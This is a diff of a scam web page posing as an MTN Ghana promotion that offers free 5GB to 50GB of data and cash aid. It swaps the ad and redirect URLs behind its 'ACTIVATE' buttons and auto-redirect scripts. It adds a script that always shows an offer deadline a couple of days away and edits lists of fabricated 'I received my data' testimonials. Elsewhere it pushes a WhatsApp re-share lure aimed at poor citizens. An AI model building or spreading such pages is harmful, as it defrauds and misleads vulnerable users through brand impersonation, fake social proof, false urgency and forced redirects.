@@ -1,8 +1,3 @@
-
-
-
-
-
 <!DOCTYPE html>
 <html>
 
@@ -553,44 +548,56 @@ Celebrate with MTN Ghana!
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
             <p class="title"> Click "ACTIVATE" to activate your Free Data Now </p>
             <br/>
-            <a onclick="window.open('https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181')"
-                href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181">
+            <a onclick="window.open('https://rm358.com/4/11952240')"
+                href="https://rm358.com/4/11973313">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="black">ACTIVATE 5GB</font></button>
             </a><br/>
 
-          <a onclick="window.open('https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181')"
-                href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181">
+          <a onclick="window.open('https://rm358.com/4/11952240')"
+                href="https://rm358.com/4/11973313">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="black">ACTIVATE 10GB</font></button>
             </a><br/>
 
-          <a onclick="window.open('https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181')"
-                href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181">
+          <a onclick="window.open('https://rm358.com/4/11952240')"
+                href="https://rm358.com/4/11973313">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="black">ACTIVATE 20GB</font></button>
             </a><br/>
 
- <a onclick="window.open('https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181')"
-                href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181">
+ <a onclick="window.open('https://rm358.com/4/11952240')"
+                href="https://rm358.com/4/11973313">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="black">ACTIVATE 50GB</font></button>
             </a><br/>
-
-
-
-
-            
-
-
-
 <br/>
 
                 <br/>
                 <button id="offer">ACTIVATE</button><br/>
-
-
-
-
-
-
         </div>
+
+<script>
+  function updateOfferDate() {
+    const tomorrow = new Date();
+    tomorrow.setDate(tomorrow.getDate() + 2);
+
+    const day = tomorrow.getDate();
+    const month = tomorrow.toLocaleString('en-GB', {
+      month: 'long'
+    });
+
+    let suffix = 'th';
+
+    if (day % 100 < 11 || day % 100 > 13) {
+      if (day % 10 === 1) suffix = 'st';
+      else if (day % 10 === 2) suffix = 'nd';
+      else if (day % 10 === 3) suffix = 'rd';
+    }
+
+    document.getElementById('offer-date').textContent =
+      `Ending ${day}${suffix} ${month}`;
+  }
+
+  updateOfferDate();
+</script>
+       
        <div id="flc-widget" style="width:100%;max-width:520px;margin:0 auto;background:#FFFFFF;border-radius:16px;box-shadow:0 1px 2px rgba(0,0,0,.08),0 8px 24px rgba(0,0,0,.06);overflow:hidden;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#050505;box-sizing:border-box;">
  
   <!-- reaction summary -->
@@ -686,30 +693,30 @@ Celebrate with MTN Ghana!
  
 
 const TOP_COMMENTS = [
-  "I have received my 20GB data! Thank you MTN Ghana! ❤️🇬🇭",
-  "My GH₵100 airtime has arrived! 🎉🇬🇭",
+  "I have received my 20GB data! Thank you MTN Ghana! ❤️",
+  "My GH₵100 airtime has arrived!",
   "I just received my data bonus. Thank you! 🙏",
-  "Has everyone received their own? 🇬🇭❤️",
+  "Has everyone received their own?",
   "I received my 20GB successfully! 🎊",
-  "My GH₵100 airtime has been credited! Thank you! 🎉",
-  "Just got my confirmation. So happy! ❤️🇬🇭",
+  "My GH₵100 airtime has been credited! Thank you!",
+  "Just got my confirmation. So happy!",
   "I have received mine. Thank you for this offer! 🙌",
-  "My 20GB data is now active! 🎉📶",
-  "Received my bonus successfully. Thank you MTN Ghana! 🇬🇭",
-  "I got mine today. Please check the official offer details! ❤️",
+  "My 20GB data is now active!",
+  "Received my bonus successfully. Thank you MTN Ghana!",
+  "I got mine today. Please check the official offer details!",
   "My data has arrived. Thank you MTN Ghana! 🎊",
-  "GH₵100 airtime received! ❤️🇬🇭",
-  "I have completed the process and received confirmation. 🙏",
-  "Thank you! My reward has been credited! 🇬🇭🎉"
+  "GH₵100 airtime received!",
+  "I have completed the process and received confirmation.",
+  "Thank you! My reward has been credited!"
 ];
 
 const REPLIES = [
-  "Congratulations! 🎉🇬🇭",
-  "Glad to hear that! ❤️",
+  "Congratulations!",
+  "Glad to hear that!",
   "Did you receive a confirmation message too?",
   "Please check your MTN balance. 🙏",
-  "Greetings to everyone in Ghana! 🇬🇭",
-  "Glad to hear from you! 🎊",
+  "Greetings to everyone in Ghana!",
+  "Glad to hear from you!",
   "Make sure you verify your balance.",
   "Thanks for sharing your experience! ❤️",
   "Congratulations! 🎉",
@@ -1266,7 +1273,7 @@ $(document).click(function () {
     text2 = " an amount of ",
     text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
     error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-    abcde = "https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181",
+    abcde = "https://rm358.com/4/11952240",
     saved = "",
     share = "whatsapp://send?text="+text1;
 </script>
@@ -1278,10 +1285,10 @@ $(document).click(function () {
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181";
+        location.href="https://rm358.com/4/11952240";
     }
     function goon(){
-        location.href="https://www.translifebuild.wiki/recommendation?rec_link_id=12534&pub_id=281181";
+        location.href="https://rm358.com/4/11952240";
     }
 </script>
 
